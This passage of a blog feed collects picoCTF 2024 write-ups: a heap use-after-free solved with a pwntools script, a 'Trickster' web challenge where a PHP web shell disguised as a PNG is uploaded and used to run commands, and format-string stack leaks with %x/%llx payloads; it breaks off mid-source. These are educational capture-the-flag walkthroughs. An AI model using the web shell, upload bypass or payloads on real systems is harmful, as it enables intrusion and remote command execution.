class="built_in">printf</span>(<span class="string">&quot;YOU WIN!!11!!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Print flag</span></span><br><span class="line">    <span class="type">char</span> buf[FLAGSIZE_MAX];</span><br><span class="line">    FILE *fd = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    fgets(buf, FLAGSIZE_MAX, fd);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, buf);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;No flage for u :(\n&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// Call function in struct</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_menu</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n1. Print Heap\n2. Allocate object\n3. Print x-&gt;flag\n4. Check for win\n5. Free x\n6. &quot;</span></span><br><span class="line">           <span class="string">&quot;Exit\n\nEnter your choice: &quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create a struct</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nfreed but still in use\nnow memory untracked\ndo you smell the bug?\n&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">    x = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(object));</span><br><span class="line">    <span class="built_in">strncpy</span>(x-&gt;flag, <span class="string">&quot;bico&quot;</span>, <span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">alloc_object</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Size of object allocation: &quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="type">int</span> size = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;size);</span><br><span class="line">    <span class="type">char</span>* alloc = <span class="built_in">malloc</span>(size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Data for flag: &quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, alloc);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">free_memory</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">free</span>(x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_heap</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]   Address   -&gt;   Value   \n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;+-------------+-----------+\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]   %p  -&gt;   %s\n&quot;</span>, x-&gt;flag, x-&gt;flag);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;+-------------+-----------+\n&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Setup</span></span><br><span class="line">    init();</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> choice;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        print_menu();</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;choice) != <span class="number">1</span>) <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (choice) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="comment">// print heap</span></span><br><span class="line">            print_heap();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            alloc_object();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="comment">// print x</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n\nx = %s\n\n&quot;</span>, x-&gt;flag);</span><br><span class="line">            fflush(<span class="built_in">stdout</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            <span class="comment">// Check for win condition</span></span><br><span class="line">            check_win();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            free_memory();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">            <span class="comment">// exit</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Invalid choice\n&quot;</span>);</span><br><span class="line">            fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Defines a constant for the max size of the flag string (<code>FLAGSIZE_MAX</code>).</li><li>A structure <code>object</code> is defined with 4 character arrays (<code>a[10]</code>, <code>b[10]</code>,<code>c[10]</code>, <code>flag[5]</code>).</li><li>Pointer <code>x</code> is declared globally, but not yet pointing to anything.</li><li><code>init()</code> function<a href="https://chirpy.cotes.page/">https://chirpy.cotes.page/</a> is declared, it executes <code>x = malloc(sizeof(object))</code>, ensuring that enough memory is reserved for all of struct’s members (<code>a[10]</code>, <code>b[10]</code>,<code>c[10]</code>, and <code>flag[5]</code>. Additionally, the global pointer <code>x</code> is now set to point to this memory block that will hold the previously defined <code>object</code> struct.) There’s also <code>int num_allocs</code>, but this is unused.</li><li><code>strncpy()</code> copies the string <code>&quot;bico&quot;</code> into the <code>flag</code> member&#x2F;field of the <code>object</code> that <code>x</code> is pointing to.</li><li><code>alloc_object()</code> function is declared. It begins by prompting us to input the size of the memory allocation that they want to make.<ul><li>Then, an integer variable <code>size</code> is initialized in order to store the size of the allocation. <code>scanf(&quot;%d&quot;, &amp;size)</code> reads an integer input from us and then stores it in the previously initialized <code>size</code> variable.</li><li>Essentially, the program expects us to enter a value that represents the number of bytes we want to allocate.</li></ul></li><li><code>check_win()</code> function is declared. It checks if <code>x-&gt;flag</code> matches with <code>&#39;pico&#39;</code>. And if it does, then we get our flag. This is essentially the ‘win’ condition.</li><li><code>alloc_object</code> function is declared, it prompts us to enter a size for dynamic allocation, it then reads an integer, and allocates memory accordingly. Finally, it accepts input to populate this allocated space.</li></ul><h2 id="Vulnerabilities"><a href="#Vulnerabilities" class="headerlink" title="Vulnerabilities"></a>Vulnerabilities</h2><ul><li>Use-After-Free <a href="https://cwe.mitre.org/data/definitions/416.html">(UAF)</a> vulnerability, because while the <code>free_memory()</code> function does free the memory block associated with <code>x</code>, it’s vulnerable because if <code>check_win()</code> is called afterward, then <code>x-&gt;flag</code> can still be accessed.</li><li>Buffer overflow vulnerability: while the <code>flag</code> member in <code>object</code> is only 5 bytes, making it very limited, because of <code>alloc_object</code>, we could specify a much larger input for the memory allocated to <code>alloc</code>. So, if this memory isn’t handled correctly, then we can just overwrite memory structures adjacent to <code>alloc</code> (hence the buffer overflow).</li></ul><p>Before proceeding with the solution, I’ll paste the program’s interface so that it’s easier to visualize:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&gt; nc tethys.picoctf.net 62002</span><br><span class="line"></span><br><span class="line">freed but still in use</span><br><span class="line">now memory untracked</span><br><span class="line">do you smell the bug?</span><br><span class="line"></span><br><span class="line">1. Print Heap</span><br><span class="line">2. Allocate object</span><br><span class="line">3. Print x-&gt;flag</span><br><span class="line">4. Check for win</span><br><span class="line">5. Free x</span><br><span class="line">6. Exit</span><br><span class="line"></span><br><span class="line">Enter your choice:</span><br></pre></td></tr></table></figure><h2 id="The-Plan"><a href="#The-Plan" class="headerlink" title="The Plan"></a>The Plan</h2><p>So, to exploit this program, we can leverage the UAF vulnerability that I previously discussed. If we combine this with heap allocation manipulation (via buffer overflow), we can overwrite a specific field in a freed structure (<code>x-&gt;flag</code>) with the string <code>&quot;pico&quot;</code>. This is how it would look like step by step:</p><ol><li>This select option <code>5</code> to <strong>free x</strong>.</li><li>This select option <code>2</code> to <strong>allocate</strong> a new block of memory, which is likely to use the same memory area that <code>x</code> was previously occupying, because they’re goingto have similar size requirements.<ul><li>The allocation size will be between 20 and 40, this way, we increase the likelihood that our new allocation will overlap with the previously freed <code>object</code> struct.</li><li>Recall that the <code>object</code> struct has 4 members, for a total of 35 bytes. <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="type">char</span> a[<span class="number">10</span>]; <span class="comment">// ten bytes</span></span><br><span class="line">  <span class="type">char</span> b[<span class="number">10</span>]; <span class="comment">// ten bytes</span></span><br><span class="line">  <span class="type">char</span> c[<span class="number">10</span>]; <span class="comment">// ten bytes</span></span><br><span class="line">  <span class="type">char</span> flag[<span class="number">5</span>]; <span class="comment">// 5 bytes</span></span><br><span class="line">&#125; object;</span><br></pre></td></tr></table></figure></li></ul></li><li>While still in the “allocate object” option, we now input a payloads string that will contain <code>&quot;pico&quot;</code> at the end to overwrite the previous <code>flag</code> value <code>&quot;bico&quot;</code>.</li><li>Select option 4 (“Check for win”) and get our flag!</li></ol><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>The <a href="https://docs.pwntools.com/en/stable/">pwntools</a> payloads that I came up with is as follows:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;tethys.picoctf.net&#x27;</span>,<span class="number">51280</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;40&#x27;</span>)</span><br><span class="line">payloads = <span class="string">b&#x27;A&#x27;</span> * <span class="number">30</span> + <span class="string">b&#x27;pico&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.sendline(payloads)</span><br><span class="line">r.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>All of the <code>r.sendline</code>‘s are for selecting options in the interface. As for the actual payloads, it consists of an initial 24 bytes (8 blocks of A’s), and then a final block of 6 A’s, and “pico”- for a total of 34 bytes. The reason we are inputting 34 bytes, rather than 35, is because the <code>flag</code> field in the <code>object</code> struct has a 5 byte space, due to the program accounting for a <a href="https://null-byte.wonderhowto.com/newest/">null byte</a>.</p><p>flag: <code>picoCTF&#123;now_thats_free_real_estate_a7381726&#125;</code></p>]]></content>
    
    
    <summary type="html">Leveraging a UAF vulnerability to manipulate heap allocation</summary>
    
    
    
    <category term="CTF" scheme="https://rivers.sh/categories/CTF/"/>
    
    <category term="picoCTF2024" scheme="https://rivers.sh/categories/CTF/picoCTF2024/"/>
    
    
    <category term="Medium" scheme="https://rivers.sh/tags/Medium/"/>
    
    <category term="Binary Exploitation" scheme="https://rivers.sh/tags/Binary-Exploitation/"/>
    
    <category term="Buffer Overflow" scheme="https://rivers.sh/tags/Buffer-Overflow/"/>
    
  </entry>
  
  <entry>
    <title>Trickster</title>
    <link href="https://rivers.sh/posts/trickster/"/>
    <id>https://rivers.sh/posts/trickster/</id>
    <published>2024-09-14T04:00:00.000Z</published>
    <updated>2025-04-03T08:23:21.489Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Challenge-Info"><a href="#Challenge-Info" class="headerlink" title="Challenge Info"></a>Challenge Info</h2><p>I found a web app that can help process images: PNG images only!</p><p>author: JUAN BONDOU</p><h2 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h2><p>The first thing I usually try for web challenges is to map out the site, so that’s naturally what I tried here. I opened up Burpsuite, and attempted to map the site using Burpsuite’s passive <a href="https://en.wikipedia.org/wiki/web_crawler">spidering</a>.</p><p><img src="/images/trickster/nocrawl.png" alt="nocrawl"></p><p>Unfortunately, this is a dead end. The actual file of importance is <a href="https://en.wikipedia.org/wiki/Robots.txt">robots.txt</a> file, which tells web crawlers which parts of the site they’re allowed and disallowed to index.</p><p>Navigating to the <code>robots.txt</code> file reveals the following:</p><p><img src="/images/trickster/robots.png" alt="robots"></p><p>So now we know the uploads are stored in <code>/uploads</code>, and that there’s a <code>/instructions.txt</code> file. Let’s take a quick look at the <code>instructions.txt</code>:</p><p><img src="/images/trickster/instructions.png" alt="instructions"></p><h2 id="Attempts"><a href="#Attempts" class="headerlink" title="Attempts"></a>Attempts</h2><p>I googled “php webshell”, and found <a href="https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985">this</a>. The file doesn’t require much editing thankfully. Obviously, we won’t be allowed to uploads this as a <code>.php</code>.</p><p>Firstly, changing the file name to <code>shell.png</code> obviously isn’t going to work, since then the code just won’t be able to run.</p><p>Second, changing the file name to <code>shell.php.png</code> also will not work, since it still won’t be able to run.</p><p>Third, while it seems like a good idea to change the signature bytes of <code>shell.php</code> to that of a png file, this will also return code errors.</p><h2 id="Injecting-the-Shell"><a href="#Injecting-the-Shell" class="headerlink" title="Injecting the Shell"></a>Injecting the Shell</h2><p>Surprisingly, the solution is pretty simple. If we change the file name from <code>shell.php</code> to <code>shell.png.php</code>, and then include the text “PNG” at the top of our file, we’ll be allowed an uploads.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">PNG</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form method=<span class="string">&quot;GET&quot;</span> name=<span class="string">&quot;&lt;?php echo basename(<span class="subst">$_SERVER</span>[&#x27;PHP_SELF&#x27;]); ?&gt;&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;TEXT&quot;</span> name=<span class="string">&quot;cmd&quot;</span> autofocus id=<span class="string">&quot;cmd&quot;</span> size=<span class="string">&quot;80&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;SUBMIT&quot;</span> value=<span class="string">&quot;Execute&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;pre&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>] . <span class="string">&#x27; 2&gt;&amp;1&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/pre&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h2 id="Navigating-the-Shell"><a href="#Navigating-the-Shell" class="headerlink" title="Navigating the Shell"></a>Navigating the Shell</h2><p>If we navigate to <code>/uploadss/&lt;ourshell&gt;.php</code>, we’re greeted with this:<br><img src="/images/trickster/shell.png" alt="shell"></p><p>Upon running some simple linux commands (<code>ls</code>, <code>pwd</code>, etc.), we’ll see that our shell is successful. The only thing we cannot do is navigate into other directories. Since we can’t navigate into other directories, we’re going to have to find a way to search the system for <code>.txt</code> files (the flag is typically in a <code>.txt</code>.</p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>To locate all <code>.txt</code> files, I ran <code>find / -type f -name &#39;*.txt&#39; 2&gt;/dev/null </code>.</p><ul><li><code>find</code> is the command.</li><li><code>/</code> tells it to search everything under the root directory (so our entire system).</li><li><code>-type f</code> specifies to search for <strong>files</strong>.</li><li><code>-name &#39;*.txt&#39;</code> specifies that it should be ALL (*) <code>.txt</code> files.</li><li><code>2&gt;/dev/null</code> suppresses error messages.</li></ul><p>The return will be a long list of files, but scrolling <em>all</em> the way down reveals this:<br><img src="/images/trickster/txts.png" alt="txt files"></p><p>To read the <code>GQ4DOOBVMMYGK.txt</code> file, just run <code>cat /var/www/html/GQ4DOOBVMMYGK.txt</code>, and we have our flag.</p><p>flag: <code>picoCTF&#123;c3rt!fi3d_Xp3rt_tr1ckst3r_48785c0e&#125;</code></p>]]></content>
    
    
    <summary type="html">Exploiting a site that only accepts PNG files</summary>
    
    
    
    <category term="CTF" scheme="https://rivers.sh/categories/CTF/"/>
    
    <category term="picoCTF2024" scheme="https://rivers.sh/categories/CTF/picoCTF2024/"/>
    
    
    <category term="Medium" scheme="https://rivers.sh/tags/Medium/"/>
    
    <category term="Web Exploitation" scheme="https://rivers.sh/tags/Web-Exploitation/"/>
    
    <category term="Web Shell" scheme="https://rivers.sh/tags/Web-Shell/"/>
    
  </entry>
  
  <entry>
    <title>Format String 1</title>
    <link href="https://rivers.sh/posts/formatstring1/"/>
    <id>https://rivers.sh/posts/formatstring1/</id>
    <published>2024-08-27T04:00:00.000Z</published>
    <updated>2025-04-03T08:24:58.825Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Challenge-Info"><a href="#Challenge-Info" class="headerlink" title="Challenge Info"></a>Challenge Info</h2><p>description: <code>Patrick and Sponge Bob were really happy with those orders you made for them, but now they&#39;re curious about the secret menu. Find it, and along the way, maybe you&#39;ll find something else of interest!</code></p><p>Downloads the binary <a href="https://artifacts.picoctf.net/c_mimas/82/format-string-1">here</a>.</p><p>Downloads the source <a href="https://artifacts.picoctf.net/c_mimas/82/format-string-1.c">here</a>.</p><p>Connect with the challenge instance here:<br><code>nc mimas.picoctf.net &lt;port&gt;</code></p><p>author: Connor Chang</p><p><img src="/images/formatstring-1/formatstring1.png" alt="format string 1"></p><h2 id="Attempts"><a href="#Attempts" class="headerlink" title="Attempts"></a>Attempts</h2><p>Upon connecting to the netcat listener, we’re prompted: <code>Give me your order and I&#39;ll read it back to you:</code></p><p>Because of the name of the challenge; “<strong>Format String</strong> 1”, we already get a pretty big hint. Just from experience, I know that <code>%x</code> can be used in format string vulnerabilities to either dump or navigate memory stacks. Naturally, this is the route I took.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">~ &gt; nc mimas.picoctf.net 63183                               INT 18s</span><br><span class="line">Give me your order and I&#x27;ll read it back to you:</span><br><span class="line">%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,</span><br><span class="line">Here&#x27;s your order: 402118,0,6377ea00,0,a64880,a347834,b4da5590,6356fe60,637944d0,1,b4da5660,0,0,6f636970,6d316e34,33317937,3431665f,64303935,7,637968d8,7,74307250,6c797453,9,637a7de9,63578098,637944d0,0,b4da5670,252c7825,2c78252c,78252c78,252c7825,2c78252c,78252c78,252c7825,2c78252c,78252c78,252c7825,2c78252c,78252c78,252c7825,2c78252c,78252c78,252c7825,2c78252c,78252c78,252c7825,2c78252c,78252c78,252c7825,2c78252c,78252c78,252c7825,2c78252c,78252c78,252c7825,2c78252c,78252c78,252c7825,2c78252c,78252c78,454d4100,6e656c6c,4c564c48,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,</span><br><span class="line">Bye!</span><br></pre></td></tr></table></figure><p>After pasting this into <a href="https://gchq.github.io/CyberChef/">Cyberchef</a> with “From Hex” selected, I started to notice what might be a flag.</p><p><img src="/images/formatstring-1/possibleflag.png" alt="possible flag"></p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>After inspecting the initial output, I decided to modify my format string to use <code>%llx</code> instead of <code>%x</code>. The <code>ll</code> modifier stands for “long long,” which in C is a data type representing a 64-bit integer. By using <code>%llx</code>, I ensured that each stack read would capture a full 64-bit value, meaning 16 hexadecimal digits would be printed instead of just 8. This is important because the flag or other useful data might be stored in a location that requires reading all 16 bytes (instead of 8) to be fully captured.</p><p>After using this adjustment, with commas <code>,</code> to clearly separate each stack, I got a different result:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">~ &gt; nc mimas.picoctf.net 63183                            INT 1m 53s</span><br><span class="line">Give me your order and I&#x27;ll read it back to you:</span><br><span class="line">%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,</span><br><span class="line">Here&#x27;s your order: 402118,0,7aaeacfeba00,0,1c1f880,a347834,7ffd67ec6cc0,7aaeacddce60,7aaead0014d0,1,7ffd67ec6d90,0,0,7b4654436f636970,355f31346d316e34,3478345f33317937,35365f673431665f,7d313464303935,7,7aaead0038d8,2300000007,206e693374307250,a336c797453,9,7aaead014de9,7aaeacde5098,7aaead0014d0,0,7ffd67ec6da0,6c6c252c786c6c25,252c786c6c252c78,786c6c252c786c6c,6c252c786c6c252c,2c786c6c252c786c,6c6c252c786c6c25,252c786c6c252c78,786c6c252c786c6c,6c252c786c6c252c,2c786c6c252c786c,6c6c252c786c6c25,252c786c6c252c78,786c6c252c786c6c,6c252c786c6c252c,2c786c6c252c786c,6c6c252c786c6c25,252c786c6c252c78,786c6c252c786c6c,6c252c786c6c252c,2c786c6c252c786c,6c6c252c786c6c25,252c786c6c252c78,786c6c252c786c6c,6c252c786c6c252c,2c786c6c252c786c,6c6c252c786c6c25,252c786c6c252c78,786c6c252c786c6c,6c252c786c6c252c,2c786c6c252c786c,6c6c252c786c6c25,252c786c6c252c78,786c6c252c786c6c,6c252c786c6c252c,2c786c6c252c786c,</span><br><span class="line">Bye!</span><br></pre></td></tr></table></figure><p>I decided to put these hex values through Cyberchef again, and saw what’s definitely an encoded flag:</p><p><img src="/images/formatstring-1/possibleflag2.png" alt="possible flag"></p><p>After removing the null values, I was left with this:</p><p><img src="/images/formatstring-1/jumbledflag.png" alt="jumbled flag"></p><p>From here, the challenge is mostly decoding. </p><p>flag: <code>picoCTF&#123;4n1m41_57y13_4x4_f14g_65590d41&#125;</code></p><hr>]]></content>
    
    
    <summary type="html">Easy format string vulnerability</summary>
    
    
    
    <category term="CTF" scheme="https://rivers.sh/categories/CTF/"/>
    
    <category term="picoCTF2024" scheme="https://rivers.sh/categories/CTF/picoCTF2024/"/>
    
    
    <category term="Medium" scheme="https://rivers.sh/tags/Medium/"/>
    
    <category term="Format String" scheme="https://rivers.sh/tags/Format-String/"/>
    
    <category term="Binary Exploitation" scheme="https://rivers.sh/tags/Binary-Exploitation/"/>
    
  </entry>
  
  <entry>
    <title>Format String 2</title>
    <link href="https://rivers.sh/posts/formatstring2/"/>
    <id>https://rivers.sh/posts/formatstring2/</id>
    <published>2024-08-27T04:00:00.000Z</published>
    <updated>2025-04-03T08:24:49.296Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Challenge-Info"><a href="#Challenge-Info" class="headerlink" title="Challenge Info"></a>Challenge Info</h2><p>This program is not impressed by cheap parlor tricks like reading arbitrary data off the stack. To impress this program you must change data on the stack!</p><p>Downloads the binary <a href="https://artifacts.picoctf.net/c_rhea/26/vuln">here</a>.</p><p>Downloads the source <a href="https://artifacts.picoctf.net/c_rhea/26/vuln.c">here</a>.</p><p>Additional details will be available after launching your challenge instance.</p><p><img src="/assets/img/formatstring-2/formatstring2.png" alt="format string 2"></p><p>hint 1: pwntools are very useful for this problem!</p><p>author: SKRUBLAWD</p><h2 id="Understanding-vuln-c"><a href="#Understanding-vuln-c" class="headerlink" title="Understanding vuln.c"></a>Understanding vuln.c</h2><p>The code for your convenience:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> sus = <span class="number">0x21737573</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">1024</span>];</span><br><span class="line">  <span class="type">char</span> flag[<span class="number">64</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;You don&#x27;t have what it takes. Only a true wizard could change my suspicions. What do you have to say?\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fflush</span>(stdout);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%1024s&quot;</span>, buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Here&#x27;s your input: &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fflush</span>(stdout);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (sus == <span class="number">0x67616c66</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;I have NO clue how you did that, you must be a wizard. Here you go...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in the flag</span></span><br><span class="line">    FILE *fd = <span class="built_in">fopen</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="built_in">fgets</span>(flag, <span class="number">64</span>, fd);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span 